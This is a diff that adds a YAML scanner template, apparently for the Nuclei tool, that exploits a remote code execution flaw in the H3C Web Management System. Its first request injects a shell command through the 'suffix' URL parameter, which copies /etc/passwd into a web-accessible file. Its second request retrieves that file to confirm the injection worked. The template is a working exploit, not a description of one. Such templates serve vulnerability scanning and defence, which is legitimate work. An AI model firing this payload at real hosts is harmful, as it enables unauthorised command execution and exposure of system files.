@@ -1,0 +1,42 @@
+id: h3c-web-nals-submit-rce
+info:
+  name: H3C Web Management System Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template exploits a remote code execution vulnerability in the H3C Web Management System.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60cat%20/etc/passwd%60%20|tee%20/usr/local/webui/sslvpn/{{t1}}.txt|ls"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"success":"wchat_logo"'
+      - type: word
+        words:
+          - "logout.php"
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/sslvpn/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
